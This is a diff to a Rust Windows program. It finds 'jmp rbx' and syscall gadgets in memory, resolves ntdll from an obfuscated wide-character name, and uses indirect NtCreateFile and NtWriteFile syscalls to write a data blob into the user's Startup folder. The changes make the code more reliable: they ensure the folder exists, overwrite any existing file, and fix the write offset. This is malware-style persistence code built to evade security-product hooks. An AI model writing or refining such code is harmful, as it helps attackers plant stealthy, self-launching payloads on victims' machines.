@@ -12,10 +12,11 @@ use std::ffi::c_void;
 use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING, GENERIC_WRITE, S_OK};
 use windows_sys::Win32::Storage::FileSystem::FILE_ATTRIBUTE_NORMAL;
 use windows_sys::Win32::System::Com::{
-    CoInitialize, CoCreateInstance, CLSCTX_ALL, IStream, CoTaskMemFree,
+    CoInitializeEx, CoCreateInstance, CLSCTX_ALL, IStream, CoTaskMemFree,
+    COINIT_APARTMENTTHREADED,
 };
 use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
-use windows_sys::Win32::UI::Shell::{SHGetKnownFolderPath, KF_FLAG_DONT_VERIFY};
+use windows_sys::Win32::UI::Shell::{SHGetKnownFolderPath, KF_FLAG_CREATE};
 use windows_sys::core::GUID;
 
 const FOLDERID_Startup: GUID = GUID {
@@ -146,7 +147,7 @@ pub struct IO_STATUS_BLOCK {
 }
 
 const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
-const FILE_OPEN_IF: u32 = 0x00000003;
+const FILE_OVERWRITE_IF: u32 = 0x00000005;
 const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
 const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
 const SYNCHRONIZE: u32 = 0x00100000;
@@ -164,10 +165,7 @@ fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
 fn main() {
     unsafe {
         // Initialize COM (STA)
-        let hr = CoInitialize(null_mut());
-        if hr != S_OK && hr != 0x00040102 { // S_FALSE or RPC_E_CHANGED_MODE are acceptable
-            // continue anyway, maybe it was already initialized
-        }
+        let _ = CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED as u32);
 
         let ntdll_name = ['n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
         let ntdll_base = syscalls::get_module_base(&ntdll_name);
@@ -181,7 +179,8 @@ fn main() {
         let jmp_rbx_gadget = syscalls::find_gadget_globally(&[&[0xFF, 0xE3], &[0x53, 0xC3]]).expect("Failed to find jmp rbx gadget");
 
         let mut path_ptr: *mut u16 = null_mut();
-        if SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_DONT_VERIFY as u32, 0, &mut path_ptr) != S_OK {
+        // Use KF_FLAG_CREATE to ensure it exists
+        if SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_CREATE as u32, 0, &mut path_ptr) != S_OK {
             return;
         }
 
@@ -249,7 +248,7 @@ fn main() {
                                     0, // AllocationSize
                                     FILE_ATTRIBUTE_NORMAL as usize,
                                     0, // ShareAccess
-                                    FILE_OPEN_IF as usize,
+                                    FILE_OVERWRITE_IF as usize,
                                     (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as usize,
                                     0, // EaBuffer
                                     0  // EaLength
@@ -257,6 +256,7 @@ fn main() {
 
                                 if status == 0 {
                                     let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
+                                    let mut byte_offset: i64 = 0;
                                     crate::syscall!(
                                         nt_write_file_ssn,
                                         syscall_gadget,
@@ -268,7 +268,7 @@ fn main() {
                                         &mut write_io_status as *mut _ as usize,
                                         data_ptr as usize,
                                         stat.cbSize as u32,
-                                        0, // ByteOffset (NULL means current position, which is 0 for new file)
+                                        &mut byte_offset as *mut _ as usize,
                                         0  // Key
                                     );
                                     crate::syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
